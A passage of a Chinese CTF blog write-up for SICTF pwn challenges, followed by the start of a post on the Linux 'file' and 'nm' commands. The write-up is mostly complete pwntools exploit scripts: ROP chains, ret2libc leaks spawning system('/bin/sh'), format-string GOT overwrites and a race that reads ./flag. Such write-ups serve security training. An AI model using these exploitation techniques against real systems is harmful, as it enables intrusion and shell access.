p32(0x08056550) # xor eax, eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x0807c6fa) # inc eax ; ret p += p32(0x08049623) # int 0x80 pay = b\u0026#39;/flag;AAABBBCCCDDDEEEFFFAAAA\u0026#39; + p #gdb.attach(io,\u0026#39;b *0x080488D0\u0026#39;) io.send(pay) fmt2 SiLibrary #io = remote() io.interactive() 这个代码我测试过，是实际可用的，但是我自己生成的时候却无法还原，可能和我的环境有关\n法二：使用win函数用格式化字符串查看flag内容 程序给了一个win函数来将flag读入到栈内：\n因为flag在一个远程环境中是不变的，而程序限制v2的读入长度，所以我们可以一个一个地读入：\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes todo = [] def pwn(times: int): global todo rmt: bool = False fn: str = \u0026#34;./sictf-C@na2y\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;10023\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;ctf.qsnctf.com\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x8048951 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x18 + 4 backdoor = m_elf.sym[\u0026#39;win\u0026#39;] payload = flat({offset:[ backdoor ]}) sendline_after_clean(payload) sendline_after_clean(f\u0026#34;%{times}$x\u0026#34;) recved = p.recvuntil(b\u0026#34;\\n\u0026#34;, True) if len(recved) % 2 != 0: recved = b\u0026#34;0\u0026#34; + recved todo.append(recved.decode(\u0026#34;UTF-8\u0026#34;)) p.close() for i in range(10, 22): pwn(i) print(todo) s = \u0026#34;\u0026#34; for ele in todo: tmp = \u0026#34;\u0026#34; for i in range(0, len(ele), 2): tmp = chr(int(ele[i:i+2], 16)) + tmp s += tmp print(s) easystack checksec查看程序架构 ida查看伪C代码 程序的整体逻辑就是先输入一个达不到栈溢出长度的字符串，然后把这个字符串复制到更低位的栈上，但是遇到\\x00就停止复制\n这就意味着，我们在check的栈上只能溢出一句到ret上，但在这个程序上显然不能直接getshell\n于是我就想，既然check的栈更低，那能不能和main函数中的输入到栈中的payload连在一起呢？\n但一个ret肯定是不行的，但是别忘了，能改变栈指针的还有pop和push，\n如果我们使用这个pop掉5个的gadget，那么我们不仅能和我们的payload接上，而且还会跳过payload中的pop_5_ret：\n那么，其实我们已经可以忽视check函数了，只需要将payload构造成这样，[content]部分就能够被执行\nflat({offset:[ pop_5_ret, [content] ]}) 因此题目就被转化成常规的ret2libc了\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./sictf-easystack\u0026#34; libc_name: str = \u0026#34;./libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x40075D c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... # 查找gadget的内置函数 rop_gadget = ROP(m_elf) pop_rdi_ret: int = rop_gadget.find_gadget([\u0026#34;pop rdi\u0026#34;, \u0026#34;ret\u0026#34;])[0] ret: int = rop_gadget.find_gadget([\u0026#34;ret\u0026#34;])[0] pop_5_ret = 0x000000000040089b suclog( \u0026#34;pop_5_ret\u0026#34;, pop_rdi_ret=pop_rdi_ret, ret=ret, ) #需要自行设定offset offset:int = 0x10 # 需要改为需要的输入函数，默认为puts puts_plt: int = m_elf.plt[\u0026#34;puts\u0026#34;] puts_got: int = m_elf.got[\u0026#34;puts\u0026#34;] main_addr: int = m_elf.sym[\u0026#34;main\u0026#34;] suclog( puts_plt=puts_plt, puts_got=puts_got, main_addr=main_addr ) sendline_after_clean(b\u0026#34;512\u0026#34;) # 发送payload payload = flat({offset:[ pop_5_ret, pop_rdi_ret, puts_got, puts_plt, main_addr ]}) sendline_after_clean(payload) p.recvuntil(b\u0026#34;welcome to sictf\\n\u0026#34;) # 得到真实地址 puts_addr:int = recv_and_transform() # 计算得到基址和system地址 base_addr: int = puts_addr - libc.sym[\u0026#39;puts\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] bin_sh_addr: int = base_addr + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) suclog( puts_addr=puts_addr, base_addr=base_addr, system_addr=system_addr, bin_sh_addr=bin_sh_addr ) # 发送payload sendline_after_clean(b\u0026#34;512\u0026#34;) # 注意栈对齐 payload = flat({offset:[ pop_5_ret, ret, pop_rdi_ret, bin_sh_addr, system_addr ]}) sendline_after_clean(payload) interactive_after_clean() SiLibrary checksec查看程序架构 ida查看伪C代码 这道题是C++反编译，因此阅读可能会有一点困难\n但是仔细阅读一下会发现，程序逻辑其实挺容易理解的\n只要先把线程挂起，因为里面有一个sleep，在这一秒内将bookname改为./flag就行\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./sictf-SiLibrary\u0026#34; libc_name:str = \u0026#34;/usr/lib/x86_64-linux-gnu/libstdc++.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... sendline_after_clean(\u0026#34;3\u0026#34;) sendline_after_clean(\u0026#34;2\u0026#34;) sendline_after_clean(\u0026#34;1\u0026#34;) sendline_after_clean(\u0026#34;./flag\\x00\u0026#34;) interactive_after_clean() fmt2 checksec查看程序架构 ida查看伪C代码 一次栈上格式化字符串漏洞，两次非栈上格式化字符串漏洞，而且第一次栈上格式化字符串漏洞之后还有一次机会改变栈上内容\n最离谱的是，虽然没有给libc，但是程序中是有system的\n我们可以在第一次泄露出pie的基址，然后将printf_got、printf_got+2安排在栈上，然后通过格式化字符串将printf_got更改为system_plt\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./sictf-fmt\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... payload = b\u0026#34;%3$p.%1$p.\u0026#34; sendline_after_clean(payload) pie_addr = recv_and_transform(from_bytes=False, bound=b\u0026#34;.\u0026#34;) - 49 - m_elf.sym[\u0026#39;main\u0026#39;] stack_addr = recv_and_transform(from_bytes=False, bound=b\u0026#34;.\u0026#34;) + 96 printf_got = pie_addr + m_elf.got[\u0026#39;printf\u0026#39;] system_plt = pie_addr + m_elf.plt[\u0026#39;system\u0026#39;] suclog( \u0026#34;printf_got\u0026#34;, \u0026#34;system_plt\u0026#34; ) payload = flat([ printf_got, printf_got + 2, ]) sendline_after_clean(payload, \u0026#34;You have one chance to change it\u0026#34;) fmt = \u0026#34;\u0026#34; write1 = system_plt \u0026amp; 0xffff write2 = (system_plt \u0026gt;\u0026gt; (2*8)) \u0026amp; 0xffff write_dict = {write1:7, write2:8} write_list = [write1, write2] write_list.sort() tmp = 0 for ele in write_list: fmt += f\u0026#34;%{ele-tmp}c%{write_dict[ele]}$hn\u0026#34; tmp = ele fmt += \u0026#34;\\x00\u0026#34; sendline_after_clean(fmt, \u0026#34;I hope to get your blessing\u0026#34;) sendline_after_clean(b\u0026#34;/bin/sh\\x00\u0026#34;) print(fmt) interactive_after_clean() ","date":"2023年01月22日","permalink":"https://peterliuzhi.top/writeup/sictf-pwn-writeup/","section":"writeup","summary":"Never mistake motion for action. — Ernest Hemingway sictf_pwn C@na2y checksec查看程序架构 ida查看伪C代码 法一：直接用ropper或者ROPgadget生成ROP链 最简单的方法，使用ropp","tags":["pwn","格式化字符串漏洞","C++pwn","相邻栈交互"],"title":"SICTF PWN WriteUp"},{"categories":["tricks"],"contents":" Action is the foundational key to all success. — Pablo Picasso\n💡如需使用本文中介绍的大部分命令，请确保系统安装了binutils，如未安装，请使用如下命令安装：sudo apt-get install binutils\nfile 我们对一个文件使用该命令看一下：\nfile login 我们能够看到，这个文件是一个64位的ELF文件，他运行在x86-64平台上，并且他的符号表没有被删除（not stripped）\n我们对一个文本文档试一下：\n我们发现file命令能识别出它是一个python脚本，同时识别出了它是一个UTF-8编码的文件，而且标出他是一个文本可执行文件（text executable），对应上面的LSB executable，Linux标准基础（Linux Standards Base，简称LSB）可执行文件\n如果我们去除.py扩展名，它是否还能识别出来它是一个python脚本呢？\n仍然可以识别，说明file命令会根据文件内容进行判断\n我们新建一个tmp文件，看看能识别出什么：\n得到结果是empty\n如果我们加上一个shebang：\n发现它此时不能判断它是一个python文件，但是通过shebang判断出了它的解释器\n如果我们加上一句python语句：\n如果我们加上C语言代码：\n它仍然判断为python脚本，说明file给出的结果不一定是正确的，需要具体问题具体分析。file命令也可以根据幻数判断文件类型，然而这时候可能会导致file的判断出现差错\n如果一个文件碰巧包含了某种文件格式的标记，file等工具很可能会错误地识别这个文件。你可以使用一个十六进制文件编辑器将任何文件的前 4 字节修改为 Java 的幻数序列 CA FE BA BE，自己证实一下上述情况。这时，file 会将这个新修改的文件错误地识别为已编译的 Java 类数据。同样，一个仅包含 MZ 这两个字符的文本文件会被误认为是一个 MS-DOS 可执行文件。\n如果我们去掉shebang，就可以发现它是一个C语言源文件：\n我们还可以通过通配符对特定一批文件进行分析：\n可以使用grep选择：\nfile还有一系列选项，但一般来说这已经够了\n如果我们希望在Windows上使用，可以安装Cygwin\nnm 虽然名字有些让人浮想联翩，但是它确实在某些情况挺好用的\nnm是一个分析文件中的符号的命令，它可以将可执行文件中的函数符号分类列出：\n我们发现它是一个C++可执行文件，并且它的符号都被分类列出了（以下翻译自man nm）：\n大写字母表示全局符号，小写字母则表示局部符号。但有一些小写字母表示特殊的含义（\u0026ldquo;u\u0026rdquo;, \u0026ldquo;v\u0026rdquo; , \u0026ldquo;w\u0026rdquo;）\n类型标志 意义 A 符号的值是绝对的，不会因为进一步的链接而改变。 B 见下 b 符号在BSS数据部分。 这个部分通常包含零初始化或未初始化的数据。尽管具体行为取决于系统。 C 见下 c 符号是普通的。 通用符号是未初始化的数据。 